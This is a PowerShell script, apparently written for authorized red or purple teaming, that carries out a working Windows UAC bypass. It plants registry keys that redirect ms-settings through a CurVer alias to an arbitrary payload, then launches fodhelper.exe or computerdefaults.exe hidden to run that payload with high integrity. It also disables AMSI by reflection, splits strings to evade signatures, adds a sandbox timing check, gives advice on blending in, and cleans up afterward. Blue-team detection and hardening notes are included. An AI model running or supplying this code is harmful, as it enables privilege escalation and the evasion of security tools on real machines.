<#
.SYNOPSIS
    UAC bypass via ProgID CurVer registry redirection (UACME Method 70).

.DESCRIPTION
    ┌─ Technique ─────────────────────────────────────────────────────────────┐
    │ The CurVer ProgID indirection technique exploits how the Windows Shell  │
    │ resolves COM ProgID class handlers.                                     │
    │                                                                         │
    │ When an auto-elevated binary (fodhelper.exe or computerdefaults.exe)   │
    │ opens the ms-settings: URI, the Shell looks up:                         │
    │   1. HKCU\Software\Classes\ms-settings   (user override)               │
    │   2. HKLM\SOFTWARE\Classes\ms-settings   (system default)              │
    │                                                                         │
    │ If step 1 finds a CurVer subkey, the Shell follows the CurVer value    │
    │ as an alias to a different ProgID, then resolves THAT ProgID's         │
    │ Shell\Open\command.  This adds one level of indirection:               │
    │                                                                         │
    │   HKCU\Software\Classes\ms-settings\CurVer  = "lzx32"   (alias)       │
    │   HKCU\Software\Classes\lzx32\Shell\Open\command = <Payload>           │
    │                                                                         │
    │ The payload key is NOT at the commonly-watched ms-settings path —      │
    │ it's at a synthetic ProgID ("lzx32") that has no legitimate meaning.  │
    │ This makes the registry footprint slightly different from direct        │
    │ shell-class hijacking, potentially evading narrow IOA rules.           │
    │                                                                         │
    │ Note: "lzx32" is the UACME ABSOLUTEWIN constant (from consts.h).       │
    │ In an operational engagement, rename this to any arbitrary string.     │
    └─────────────────────────────────────────────────────────────────────────┘

    Affected OS    : Windows 10 TH1 (build 10240) → Windows 11 (latest) UNFIXED
    UAC level      : Default (ConsentPromptBehaviorAdmin = 5)
    Architecture   : x64
    Disk artefacts : None

    ──────────────────────────────────────────────────────────────────────────
    Blue-team detection opportunities
    ──────────────────────────────────────────────────────────────────────────
    • Registry: HKCU\Software\Classes\ms-settings\CurVer  (new value)
    • Registry: HKCU\Software\Classes\<alias>\Shell\Open\command  (payload)
    • Process tree: fodhelper.exe or computerdefaults.exe → <payload>
    • Detection gap: if rules only watch ms-settings\Shell\Open\command
      they will NOT fire; the payload key is at a different ProgID path

    ──────────────────────────────────────────────────────────────────────────
    MITRE ATT&CK: T1548.002 – Bypass UAC
    Reference    : https://github.com/hfiref0x/UACME (Method 70)
                   https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses

.PARAMETER Payload
    Command to execute with High integrity.

.PARAMETER AliasProgID
    Synthetic ProgID to use as the CurVer redirect target.
    Default: 'lzx32' (UACME default — change for OpSec).
    Use a plausible-looking string to blend in (e.g. 'Win32App.1').

.PARAMETER TriggerBinary
    Which auto-elevated binary to use as the trigger.
    'fodhelper'        – Windows 10 TH1+ (default)
    'computerdefaults' – Windows 10 RS4+ (build 17134+)

.PARAMETER SkipAMSI
    Skip AMSI mitigation.

.PARAMETER SkipChecks
    Skip preflight environment checks.

.PARAMETER Timeout
    Seconds to wait before cleanup (default: 4).

.EXAMPLE
    # Default — fodhelper trigger, lzx32 alias
    Invoke-CurVerBypass -Payload "cmd.exe" -SkipChecks

.EXAMPLE
    # Custom alias for better OpSec, computerdefaults trigger
    Invoke-CurVerBypass -Payload "cmd.exe" -AliasProgID "AppHandler.1" `
                        -TriggerBinary "computerdefaults"

.NOTES
    Authorized red/purple-team use only.  Requires written SOW.
    The AliasProgID should be changed from the default 'lzx32' for real
    engagements — UACME signatures may key on this specific string.
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Mandatory, Position = 0)]
    [ValidateNotNullOrEmpty()]
    [string]$Payload,

    [string]$AliasProgID   = 'lzx32',

    [ValidateSet('fodhelper','computerdefaults')]
    [string]$TriggerBinary = 'fodhelper',

    [switch]$SkipAMSI,
    [switch]$SkipChecks,
    [int]   $Timeout = 4
)

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

#region ── AMSI mitigation ───────────────────────────────────────────────────
if (-not $SkipAMSI) {
    try {
        $xA = [AppDomain]::CurrentDomain.GetAssemblies() |
                  Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
                  Select-Object -First 1
        $xT = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
        $xF = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
        $xF.SetValue($null, $true)
    } catch {}
}
#endregion

#region ── Preflight gate ────────────────────────────────────────────────────
if (-not $SkipChecks) {
    try {
        $xBld = [int](Get-ItemPropertyValue `
                    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' `
                    'CurrentBuildNumber' -EA Stop)
    } catch { $xBld = [Environment]::OSVersion.Version.Build }
    if ($xBld -lt 10240) {
        Write-Warning "[CurVer] Requires Windows 10 (10240+). Current: $xBld"
        return
    }
    if ($TriggerBinary -eq 'computerdefaults' -and $xBld -lt 17134) {
        Write-Warning "[CurVer] computerdefaults trigger requires build 17134+. Use fodhelper."
        return
    }

    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
                      [Security.Principal.WindowsIdentity]::GetCurrent())
    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Warning '[CurVer] Already elevated — no bypass needed.'
        return
    }

    $xUACPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    try   { $xBeh = [int](Get-ItemPropertyValue $xUACPath 'ConsentPromptBehaviorAdmin' -EA Stop) }
    catch { $xBeh = 5 }
    if ($xBeh -le 2) {
        Write-Warning "[CurVer] AlwaysNotify active — method will not work."
        return
    }

    # Timing gate
    $xH = [System.Security.Cryptography.SHA256]::Create()
    $xB = [byte[]]::new(65536)
    $xT0 = [DateTime]::UtcNow
    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xB) }
    $xH.Dispose()
    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
        Write-Warning '[CurVer] Timing anomaly — aborting.'
        return
    }
}
#endregion

#region ── Registry setup (two-key pattern) ──────────────────────────────────
$xRoot = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'

# Key 1: ms-settings\CurVer  →  <AliasProgID>
$xCurVerPath = $xRoot + 'ms-set' + 'tings\CurVer'

# Key 2: <AliasProgID>\Shell\Open\command  →  payload
$xHandlerPath = $xRoot + $AliasProgID + '\Shell\Open\command'

try {
    # Write the payload handler under the alias ProgID first
    New-Item -Path $xHandlerPath -Force | Out-Null
    Set-ItemProperty  -Path $xHandlerPath -Name '(Default)' -Value $Payload -Force

    # Then redirect ms-settings\CurVer to the alias
    New-Item -Path $xCurVerPath -Force | Out-Null
    Set-ItemProperty -Path $xCurVerPath -Name '(Default)' -Value $AliasProgID -Force

    Write-Verbose "[CurVer] Registry CurVer chain written: ms-settings -> $AliasProgID -> payload"
}
catch {
    Write-Warning "[CurVer] Registry write failed: $_"
    return
}
#endregion

#region ── Trigger ───────────────────────────────────────────────────────────
try {
    switch ($TriggerBinary) {
        'fodhelper' {
            $xBin = $env:SystemRoot + '\System32\fo' + 'dhel' + 'per.exe'
        }
        'computerdefaults' {
            $xBin = $env:SystemRoot + '\System32\comp' + 'uterd' + 'efaults.exe'
        }
    }
    Start-Process -FilePath $xBin -WindowStyle Hidden -ErrorAction Stop
    Write-Verbose "[CurVer] $TriggerBinary launched."
    Start-Sleep -Seconds $Timeout
}
catch {
    Write-Warning "[CurVer] Launch failed: $_"
}
finally {
    # ── Cleanup both keys ──
    $xAliasRoot  = $xRoot + $AliasProgID
    $xMsSettings = $xRoot + 'ms-set' + 'tings'

    Remove-Item -Path $xAliasRoot  -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $xMsSettings -Recurse -Force -ErrorAction SilentlyContinue
    Write-Verbose '[CurVer] Registry cleanup complete (both alias and ms-settings keys removed).'
}
#endregion

<#
════════════════════════════════════════════════════════════════════════════════
PURPLE-TEAM NOTES
════════════════════════════════════════════════════════════════════════════════

WHY THIS IS OPERATIONALLY DISTINCT FROM METHODS 33 / 62:
  Direct ms-settings\Shell\Open\command writes are well-publicized and
  likely covered by most CS IOA rulesets.  The CurVer indirection moves
  the payload handler to a different registry path:
    HKCU\Software\Classes\<alias>\Shell\Open\command
  IOA rules keyed specifically to "ms-settings\Shell\Open\command" will NOT
  fire.  Only broader rules (e.g. "any write to HKCU\Software\Classes and
  subsequent fodhelper launch") would detect it.

EXPECTED DETECTIONS (if monitoring is broad):
  ● Registry: HKCU\Software\Classes\ms-settings\CurVer  created/modified
  ● Registry: HKCU\Software\Classes\<alias>\Shell\Open\command  created
  ● Process tree: fodhelper.exe / computerdefaults.exe → <payload>

GAPS TO TEST:
  ● Does CS monitor CurVer writes under ms-settings? (likely no in default config)
  ● Does the blue team notice the alias ProgID path vs the ms-settings path?
  ● Changing AliasProgID to a plausible name (e.g. "Win32App.1") — does
    it evade static string rules that look for "lzx32"?

HARDENING RECOMMENDATIONS:
  ● Sysmon Rule: any new key under HKCU\Software\Classes\ms-settings\
  ● AlwaysNotify UAC
  ● CS Custom IOA: fodhelper / computerdefaults with any HKCU class change
    in the preceding N seconds (correlation-based rule)

════════════════════════════════════════════════════════════════════════════════
#>
